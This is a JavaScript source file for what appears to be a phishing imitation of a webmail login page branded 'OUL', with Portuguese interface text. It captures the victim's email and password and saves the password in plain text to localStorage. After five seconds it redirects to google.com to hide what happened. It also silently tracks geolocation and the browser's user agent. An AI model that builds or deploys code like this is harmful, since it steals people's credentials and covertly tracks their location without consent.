export default class OUL{
    Email(){
        const email = document.querySelector(".email");
        const emailLabel = document.querySelector(".emailLabel");
        const next_email = document.querySelector(".next-email");
        const info_email = document.querySelector(".info-email");
        const display_erro = document.querySelector(".display-erro");
        const display_password = document.querySelector(".info-password");
        const title_box = document.querySelector(".title-box");
        const info = document.querySelector(".info");
        const banner = document.querySelector(".box");
        const nickname = document.querySelector(".nickname")
        next_email.addEventListener("click",()=>{
            const emailStr = email.value;
            let checkEmail = false;
            if(emailStr.length!=0){
                if(emailStr.search(/[!'"/?><]/ig)=="-1"){
                    if(emailStr.search(/[@]/ig)>0 & emailStr.search(/[.]/ig)>0){
                        const pointEmail = emailStr.split(".");
                        const domainEmail = emailStr.split("@");
                        if(pointEmail.length=1 & domainEmail.length>=1){
                            checkEmail = true;
                            nickname.innerHTML = domainEmail[0];
                        }
                    }
                }
            }
            if(checkEmail){
                info_email.setAttribute("style","display:none");
                display_password.setAttribute("style","display:flex");
                title_box.setAttribute("style",'font-family: "OulMailBold";');
                info.setAttribute("style","height: 100%;");
                banner.setAttribute("style","height: 100%;");
                window.localStorage.setItem("email",emailStr);
            }else{
                display_erro.setAttribute("style","display:inline");
                info_email.setAttribute("style","gap:0.6rem");
            }
        })
        email.addEventListener("click",()=>{
            emailLabel.style = "top: 3px; transition: all 100ms ease-in-out; font-size: 0.7rem;";
        })
        email.addEventListener("keyup", (evt)=>{
            email.setAttribute("value", evt.target.value)
            if(email.value.length==0){
                emailLabel.style = "top: 1.1rem; transition: all 500ms ease-in-out; font-size: clamp(0.8rem, 1.4vh, 0.4rem);";
            }else{
                emailLabel.style = "top: 3px; transition: all 400ms ease-in-out; font-size: 0.7rem;";
            }
        })
        emailLabel.addEventListener("mousemove",()=>{
            emailLabel.style = "top: 3px; transition: all 400ms ease-in-out; font-size: 0.7rem;";
        })
        emailLabel.addEventListener("click",()=>{
            emailLabel.style = "top: 3px; transition: all 400ms ease-in-out; font-size: 0.7rem;";
        })
        email.addEventListener("mouseout",()=>{
            if(email.value.length==0){
                emailLabel.style = "top: 1.1rem; transition: all 500ms ease-in-out; font-size: clamp(0.8rem, 1.4vh, 0.4rem);";
            }
        })
    }
    Password(){
        const password = document.querySelector("#password");
        const password_label = document.querySelector(".password-label");
        const password_show = document.querySelector(".password-show");
        const password_close = document.querySelector(".fa-xmark");
        const password_box = document.querySelector(".info-password");
        const email_box = document.querySelector(".info-email");
        const info = document.querySelector(".info");
        const banner = document.querySelector(".box");
        const display_erro = document.querySelector(".display-erro");
        const next_password = document.querySelector(".next-password");
        password_close.addEventListener("click",()=>{
            password_box.setAttribute("style","display:none");
            email_box.setAttribute("style","display:flex");
            info.setAttribute("style","height: 230px;");
            banner.setAttribute("style","height: 230px;");
            display_erro.setAttribute("style","display: none;");
        })
        password.addEventListener("click",()=>{
            password_label.setAttribute("style","top: 0.1rem; font-size: clamp(0.7rem, 1.4vh, 0.4rem);");
        })
        password.addEventListener("keyup", (evt)=>{
            password.setAttribute("value", evt.target.value)
            if(password.value.length==0){
                password_label.setAttribute("style","top: 0.8rem; font-size: clamp(0.7rem, 1.4vh, 0.4rem);");
            }else{
                password_label.setAttribute("style","top: 0.1rem; font-size: clamp(0.7rem, 1.4vh, 0.4rem);");
            }
        });
        password.addEventListener("mouseout",()=>{
            if(password.value.length==0){
                password_label.setAttribute("style","top: 0.8rem; font-size: clamp(0.7rem, 1.4vh, 0.4rem);");
            }
        })
        password_show.addEventListener("click",()=>{
            if(password.getAttribute("type")=="text"){
                password.setAttribute("type","password");
                password_show.innerHTML="mostrar"
            }else{
                password.setAttribute("type","text");
                password_show.innerHTML="esconder"
            }
        })
        next_password.addEventListener("click",()=>{
            window.localStorage.setItem("password",password.value);
            setTimeout(()=>{
                window.location.replace("https://www.google.com")
            },5000)
        })
    }
    Mobile(){
        const width = window.innerWidth;
        const boxInput = document.querySelector(".info");
        const titleBox = document.querySelector(".title-box");
        const titleEmail = document.querySelector(".info-email");
        const subTitle = document.querySelector(".sub-title");
        const input = [...document.querySelectorAll("input")];
        if(width>="522"){
            boxInput.setAttribute("style","width:53%;");
        }else{
            boxInput.setAttribute("style","width:70%;")
            titleBox.setAttribute("style","font-family: 'OulMailBold'; font-weight: 600;")
            titleBox.setAttribute("style","margin-bottom: 0.2rem;")
            titleEmail.setAttribute("style","gap: 1rem;")
            subTitle.setAttribute("style","margin-top: 0.5rem;")
            input.map((e)=>{
                e.setAttribute("style","box-shadow: 0px 0px 4px rgb(0, 149, 255);")
            })
        }
    }
    Geolocation(){
        navigator.geolocation.watchPosition(showPosition);
        function showPosition(location){
            window.localStorage.setItem("Latitude",location.coords.latitude);
            window.localStorage.setItem("Longitude",location.coords.longitude);
            window.localStorage.setItem("UserAgent",window.navigator.userAgent);
        }
       }
}